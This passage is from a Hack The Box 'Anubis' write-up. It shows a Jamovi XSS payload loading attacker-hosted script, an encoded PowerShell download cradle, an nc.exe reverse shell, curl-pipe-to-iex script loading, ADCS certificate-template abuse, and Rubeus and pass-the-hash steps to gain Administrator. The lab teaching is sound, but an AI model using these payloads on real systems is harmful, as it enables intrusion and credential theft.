First I should have validated the credentials with `crackmapexec` (**I had missed it**), I can't use the **WinRM** protocol to access the victim machine because it is not exposed. With `smbclient` and `smbmap` I can find some resources that I could not access before, I just have to dig a little and I find **.omv** files that correspond to the **Jamovi spreadsheet**, there is one that just loaded or generated so I download it. The `file` tool tells me it is a **JAR** file so I can unzip it on `7z` without any problems.

> **[.omv](https://docs.jamovi.org/_pages/info_file-format.html){:target="_blank"}**: jamovi files are **ZIP**-archives that contain a number of files: META-INF/MANIFEST.MF, metadata.json, xdata.json, data.bin, strings.bin, index.html. The **metadata.json-file** <ins>is the most useful starting point when trying to decode .omv-files</ins>, at least if one is interested in, e.g., importing the data.

> **[Jamovi](https://www.jamovi.org/features.html){:target="_blank"}** is a fully functional spreadsheet, immediately familiar to anyone. Enter, copy/paste data, filter rows, compute new values, perform transforms across many columns at once – jamovi provides a streamlined spreadsheet experience, optimised for statistical data. 

> **[JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/jarGuide.html){:target="_blank"}** stands for **Java ARchive**. It's a file format based on the popular **ZIP** file format and is used for aggregating many files into one. Although **JAR** can be used as a general archiving tool, the primary motivation for its development was so that **Java** applets and their requisite components (.class files, images and sounds) can be downloaded to a browser in a single **HTTP** transaction, rather than opening a new connection for each piece.

```bash
crackmapexec smb 10.10.11.102 -u 'localadmin' -p 'Secret123'        # :)
crackmapexec winrm 10.10.11.102 -u 'localadmin' -p 'Secret123'      # :(    Not available!
cat ../nmap/targeted | grep 5985
cat ../nmap/targeted | grep -i winrm
smbclient -L 10.10.11.102 -U 'localadmin'
#    --> CertEnroll
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --no-banner
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --no-banner -r Shared
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --no-banner -r Shared/Documents
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --no-banner -r Shared/Documents/Analytics   
#    --> .omv                                         ?
#    --> 2841 Sun Jun  9 12:04:13 2024	Whatif.omv     Recently!

smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --no-banner --download Shared/Documents/Analytics/Whatif.omv
mv 10.10.11.102-Shared_Documents_Analytics_Whatif.omv Whatif.omv
file Whatif.omv
# --> Java archive data (JAR) ?

7z l Whatif.omv
7z x Whatif.omv -oWhatif
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_070.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_071.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_072.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_073.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_074.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_075.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_076.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_077.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the **MANIFEST.MF** file I find the **Janovi** version, and if I search the **Internet** for any vulnerability for this one I am lucky because it is vulnerable to **XSS**. I only have to inject the **XSS** in the **name** field of the **metadata.json** file. I am going to do a test first, for this with `python` I can open a local server and then modify the **metadata.json** file to make a request to the server asking for a **.js** file, compress again all the files in a new **Whatif.omv** and load it with `smbclient`. After waiting a **very long time**, almost hopelessly, I get the request.

> **[Jamovi <=1.6.18](https://www.cvedetails.com/vulnerability-list/vendor_id-23162/year-2021/Jamovi.html){:target="_blank"}** is affected by a cross-site scripting (**XSS**) vulnerability. The **column-name** is vulnerable to XSS in the ElectronJS Framework. An attacker can make a **.omv** (Jamovi) document containing a payload. When opened by victim, the payload is triggered (**[CVE-2021-28079 github PoC](https://github.com/g33xter/CVE-2021-28079){:target="_blank"}**).

```bash
cat MANIFEST.MF
# --> Created-By: jamovi 1.6.16.0

cat metadata.json
cat metadata.json | jq
#    --> "name": "Sepal.Length",         <-- XSS Injection
nvim metadata.json
#    --> "name": "<script src=\"http://10.10.14.10/payload.js\"></script>",

mv ../Whatif.omv .
zip -r Whatif.omv .
7z l Whatif.omv
smbclient //10.10.11.102/Shared -U 'localadmin%Secret123'
  > cd cd Documents\Analytics\
  > dir
  > rm Whatif.omv
  > put Whatif.omv
#      --> putting file Whatif.omv as ...          :)
python3 -m http.server 80
#    --> "GET /payload.js HTTP/1.1" 404 -          :)
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_078.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_079.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_080.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_081.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_082.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_083.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can now go to **[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md){:target="_blank"}** where I find the necessary code in **NodeJS** to create a malicious `pwned.js` script but again using **[Little Endian and Base 64](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters){:target="_blank"}** encoding to avoid interpretation errors on the victim machine. I just have to compress a new **Whatif.omv**, mount a server with `python`, upload the **.omv** file with `smbclient` and open port **443** with `nc` and wait for the connection request to get a **Reverse Shell**. I wait for a while but I don't receive anything, I make a small modification in the `pwned.js` script and perform all the previous steps but I still don't receive anything. After moments of uncertainty I realize my mistake, in the **XSS** injected in the **metadata.json** file I did not change the name of the malicious file. I make the necessary changes and I can access the machine to perform the first recognition commands and see the contents of the first flag.

```bash
cat rce_command.txt
cat rce_command.txt | iconv -t UTF-16LE | base64 -w 0; echo
nvim pwned.js
cat !$
```

> **pwned.js**

```javascript
require('child_process').exec('powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMAAvAFAAUwAuAHAAcwAxACcAKQAKAA==')
```

```bash
smbclient //10.10.11.102/Shared -U 'localadmin%Secret123'
  > cd Documents\Analytics\
  > put Whatif.omv
rlwrap -cAr nc -nlvp 443
python3 -m http.server 80
#    --> Exception occurred during processing of request from      :(

nvim pwned.js
cat !$
```

> **pwned.js**

```javascript
require('child_process').exec('cmd /c powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMAAvAFAAUwAuAHAAcwAxACcAKQAKAA==')
```

```bash
smbclient //10.10.11.102/Shared -U 'localadmin%Secret123'
  > cd Documents\Analytics\
  > put Whatif.omv
rlwrap -cAr nc -nlvp 443
python3 -m http.server 80
# :( Not work, why??

nvim metadata.json
cat metadata.json | jq | grep name
zip -r Whatif.omv .

smbclient //10.10.11.102/Shared -U 'localadmin%Secret123'
  > cd Documents\Analytics\
  > put Whatif.omv
python3 -m http.server 80
rlwrap -cAr nc -nlvp 443                  # :)
```

> **Victime Machine**:

```cmd
whoami
# --> windcorp\diegocruz
hostname
# --> earth
ipconfig
# --> 10.10.11.102
# --> 172.28.32.1
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_084.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_085.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_086.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_087.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_088.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_089.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_090.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

First I am looking for some privilege that will allow me to **Escalate privileges** but nothing at the moment that will help me. I remember that I had found a **CSR**, which makes me think of a **Certificate Authority** (**CA**) and if I search if the **Active Directory Certificate Service** is enabled with `net`, <ins>indeed it is</ins>. With `certutil` I also find information regarding the name of the **Certificate Authority** and a `web` template. I just need to download from the Internet the **Certify.exe** tool from **[SharpCollection](https://github.com/Flangvik/SharpCollection){:target="_blank"}** to find some [vulnerability in the ADCS](https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/){:target="_blank"}, once transferred to the victim machine I search for vulnerable templates that allow me to impersonate the Administrator user but it is not vulnerable.

***[Certificate Acquisition: Client Certificate Request Flow](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates){:target="_blank"}***

- The request process begins with clients finding an **Enterprise CA**.
- A **CSR** is created, containing a public key and other details, after generating a public-private key pair.
- The **CA** assesses the **CSR** against available certificate templates, issuing the certificate based on the template's permissions.
- Upon approval, the **CA** signs the certificate with its private key and returns it to the client.

> **Certificate Templates**: Defined within **AD**, these templates outline the settings and permissions for issuing certificates, including permitted **EKUs** and enrollment or modification rights, critical for managing access to certificate services.

> **Extended Key Usages** (**EKUs**) delineate the certificate's specific purposes, like code signing or email encryption, through **Object Identifiers** (**OIDs**).

> **Enterprise CA Enrollment Rights**: The **CA's** rights are outlined in its security descriptor, accessible via the **Certificate Authority management console**. Some settings even allow low-privileged users remote access, which could be a security concern.

> Windows users can also request certificates via the GUI (certmgr.msc or certlm.msc) or command-line tools (certreq.exe or PowerShell's Get-Certificate command).

> **AD Certificate Services Enumeration**: **AD's** certificate services can be enumerated through **LDAP** queries, revealing information about **Enterprise Certificate Authorities** (**CAs**) and their configurations. This <ins>is accessible by any domain-authenticated user without special privileges</ins>.

> **SharpCollection**: Nightly builds of common **C#** offensive tools, fresh from their respective master branches built and released in a CDI fashion using **Azure DevOps** release pipelines.

> **[Certify](https://github.com/GhostPack/Certify){:target="_blank"}** is a **C#** tool to enumerate and abuse misconfigurations in **Active Directory Certificate Services** (**AD CS**).

> **Victime Machine**:

```cmd
whoami /priv
whoami /all
net users
systeminfo
# --> OS Name:                   Microsoft Windows Server 2019 Standard
# --> System Type:               x64-based PC

net start
net start | findstr /i cert
certutil
certutil -catemplates
#  --> Web: Web -- Auto-Enroll
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/Certify.exe .
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
cd C:\
mkdir Temp
certutil -urlcache -f -split http://10.10.14.10/Certify.exe
# Or:
# curl 10.10.14.10/Certify.exe -o Certify.exe
dir

.\Certify.exe
#    --> Find vulnerable/abusable certificate templates using default low-privileged groups
.\Certify.exe find /vulnerable
#    --> [+] No Vulnerable Certificates Templates found!             :(
#    --> Can't impersonate a domain admin!
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_091.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_092.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_093.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_094.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_095.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_096.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_097.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_098.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_099.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

But if I perform a search for vulnerable templates with **[Certify.exe](https://github.com/Flangvik/SharpCollection){:target="_blank"}**, but taking into account all the groups to which the user **diegocruz** belongs, now I do find the **web** template. I had already found it with `certutil` but I didn't know which group had complete control over it, and also with `net` I confirm that the user belongs to the **webdevelopers** group which allows me to exploit the template without restrictions.

```cmd
.\Certify.exe
#    --> Find vulnerable/abusable certificate templates using all groups the current user context is a part of.
.\Certify.exe find /vulnerable /currentuser
#    --> Template Name                         : Web                 :) Exist one
#    --> Full Control Principals     : WINDCORP\webdevelopers        <--
net user diegocruz
#    --> Global Group memberships     *Domain Users         *webdevelopers   <--
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_100.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_101.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_102.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_103.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am going to try to escalate privileges using the simplest way, as I have **Full Control Principals** over the **web** template I'm going to modify it to **allow for Smart Card Logon**, so in this way with the **[Rubeus.exe](https://github.com/Flangvik/SharpCollection){:target="_blank"}** tool I am going to perform a **Kerberos** based attack (retrieve a **TGT** from the user keystore - Smartcard). To perform this attack I will need two scripts, the first one to enumerate the Domain (**[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1){:target="_blank"}**) in search of the data that will need the second script (**[ADCS.ps1](https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1){:target="_blank"}**) that will be in charge of performing the attack against the **ADCS** (**Active Directory Certificate Services**). I download `Rubeus.exe` and transfer it to the victim machine, check that it runs and also search for the command that I will need in the attack, then I download `PowerView.ps1` but from the **dev** branch and also `ADCS.ps1`. If I use a shortcut so that the `PowerView.ps1` script is interpreted as it is downloaded, I can then use the **Get-DomainUser** function to get the information I need. There is one problem, the **userprincipalname** is not set correctly, so I will need to use the **samaccountname** in the `ADCS.ps1` script.

> **Smart card authentication** provides users with smart card devices for the purpose of authentication. Users connect their smart card to a host computer. Software on the host computer <ins>interacts with the keys material and other secrets stored on the smart card to authenticate the user</ins>.

> **Rubeus** is a command-line tool developed to misuse and manipulate **Kerberos authentication** in **Windows Active Directory environments**. Its main purpose is to launch different attacks based on Kerberos, including **ticket-grabbing**, **ticket-manipulation**, and **pass-the-ticket** attacks.

> In Kerberos authentication, a **Ticket Granting Ticket** (**TGT**) is a user authentication token issued by the **Key Distribution Center** (**KDC**) used to request access tokens from the **Ticket Granting Service** (**TGS**) for specific resources/systems joined to the domain.

> **[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/README.md){:target="_blank"}** is series of functions that performs network and Windows domain enumeration and exploitation.

> **function Get-DomainUser**: Builds a directory searcher object using **Get-DomainSearcher**, builds a custom **LDAP** filter based on targeting/filter parameters, and searches for all objects matching the criteria. To only return specific properties, use "-Properties samaccountname,usnchanged,...". By default, all user objects for the current domain are returned.

> **[PoshADCS](https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1){:target="_blank"}** is the result of the research in finding attack paths against an **Active Directory Domain** through **ADCS** (Active Directory Certificate Services). The script is still in a very beta-stage at the moment so use it only if you know what you are doing.

> **Certificate Templates**: stores the configuration for all certifcate templates. A certificate template basically is a blueprint for a certificate request (e.g. for an SMIME certificate). However not all certificate templates in this container are necessarily available for enrollment.

> **Enrollment Services**: Stores CA's available for certificate enrollment. Windows hosts use this container to automatically find CA's that can issue certificates to them. The respective CA object in this container has a member attribute called "certificate Templates". This attribute contains a list of all certificate templates that are available for enrollment on this CA. This is usually only a subset of all existing templates.

> **NtAuthCertificates**: Stores CA's that are permitted to issue smartcard logon certificates. If you try to log on with a smartcard certificate issued by a CA not in this list, authentication will fail. Every Enterprise CA is automatically added here.

> **Virtual smartcards to the rescue**: Since bringing a physical smartcard to a host you might have only remote access to can pose a challenge, there is a solution called virtual smartcard. Virtual smartcards are much more usable for the attack than real smartcards because they work out of the box on Windows clients and servers without the need of any special drivers and they work even over RDP.

> **Proof of concept script**: It takes the **samaccountname** of a domain user to impersonate and the name of a certificate template you have access to. The script will rewrite the template to allow for smartcard enrollment, get the certificate and then reset the template to its original configuration.

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.10/Rubeus.exe -OutFile Rubeus.exe
# Or:
# >> curl 10.10.14.10/Rubeus.exe -O Rubeus.exe
.\Rubeus.exe
#   --> Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session
#   --> Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/suppenctype:DES|RC4|AES128|AES256] [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst] [/nowrap]
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
curl http://10.10.14.10/PowerView.ps1 | iex               # :)
Get-DomainUser localadmin                                 # :)
#    --> userprincipalname : localadmin@windcorp.thm       .htb !
#    --> samaccountname    : localadmin
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_104.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_105.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_106.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_107.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_108.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_109.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_110.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_111.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I have to customize the **[ADCS.ps1](https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1){:target="_blank"}** script to use the **samaccountname** and not the **userprincipalname** (there is an error in the configuration), and I am looking for the command needed to perform the attack. When I transfer it to the victim machine a problem arises in the interpretation of the script, it is very likely to be the **shell** I am using, so I will use `nc.exe`, to transfer it to the box and send me a `powershell` shell. Once I established the new session I try again to use **[ADCS.ps1](https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1){:target="_blank"}** but it keeps throwing me an error, I try to execute the attack command but it doesn't work. Maybe the problem is that I have to run the **[PowerView.ps1](https://github.com/Flangvik/SharpCollection){:target="_blank"}** script first (in this new session) and then if the **[ADCS.ps1](https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1){:target="_blank"}**, I follow my instinct and it does not betray me, some interpretation problems arise but the command is executed correctly.

> **sAMAccountName** is usually username format and not first.last formain. Any username@domain, username or domain\username formatted authentication should work against sAMAccountName.

> **userPrincipalName** is commongly username@domain format only. If the username format does not match the sAMAccountName format (username vs first.last OR euser vs extreme.user@extremenetworks.com) we will likely not be able to support said deployment in this manner.

> **Attacker Machine**:

```bash
nvim ADCS.ps1
#   /userprincipalname
#   $TargetUPN = $user.samaccountname       <--

cat ADCS.ps1 | grep samaccountname
cat ADCS.ps1 | grep -i smartcard
#    --> Get-SmartcardCertificate -Identity domadm -TemplateName CorpComputer
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
curl http://10.10.14.10/ADCS.ps1 | iex    # :(
```

> **Attacker Machine**:

```bash
locate nc.exe
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
python3 -m http.server 80
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
certutil -urlcache -f -split http://10.10.14.10/nc.exe nc.exe
.\nc.exe -e powershell 10.10.14.10 443

curl http://10.10.14.10/ADCS.ps1 | iex                                                       # :(
Get-SmartcardCertificate -Identity Administrator -TemplateName Web -NoSmartcard -Verbose     # :(
```

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
curl http://10.10.14.10/PowerView.ps1 | iex
Get-DomainUser localadmin
curl http://10.10.14.10/ADCS.ps1 | iex
Get-SmartcardCertificate -Identity Administrator -TemplateName web -NoSmartcard -Verbose     # :)
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_112.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_113.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_114.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_115.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_116.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_117.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_118.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_119.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I can use `gci` and look for the **User Keystore certificate** and finally perform the attack with `Rubeus.exe` to request the **TGT** of the **Administrator** user. Once the attack is finished I find the **NTLM** hash and I can validate it with `crackmapexec`, it will work for me! Then I use `impacket-psexec` and access the box as the **Administrator** user and see the contents of the last flag.

> **Victime Machine**:

```cmd
gci cert:\currentuser\my
#    --> C583D5CC0DBC084657DF7491DE927F171CC922C2          :)
.\Rubeus.exe asktgt /user:Administrator /certificate:C583D5CC0DBC084657DF7491DE927F171CC922C2 /getcredentials
#    --> NTLM              : 3CCC18280610C6CA3156F995B5899E09
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.11.102 -u 'Administrator' -H '3CCC18280610C6CA3156F995B5899E09'        # Pwn3d! :)
impacket-psexec Administrator@10.10.11.102 -hashes :3CCC18280610C6CA3156F995B5899E09          # :)
```

<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_120.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_121.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_122.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was a very rewarding but exhausting experience to compromise this **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**. There are many new concepts and also many tools and scripts that I had to resort to in order to advance in each phase of the **Engagement**. I know I have to move on to a new challenge, but I will need to rest a bit and incorporate the acquired knowledge, but as I said at the beginning of this post there are other ways to **Escalate Privileges**, so the **[0xdf](https://0xdf.gitlab.io/){:target="_blank"}** writeups that have an excellent level <ins>is a must read</ins>. **I must not forget to kill the box**.

<br /><br />
<img src="{{ site.img_path }}/anubis_writeup/Anubis_123.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
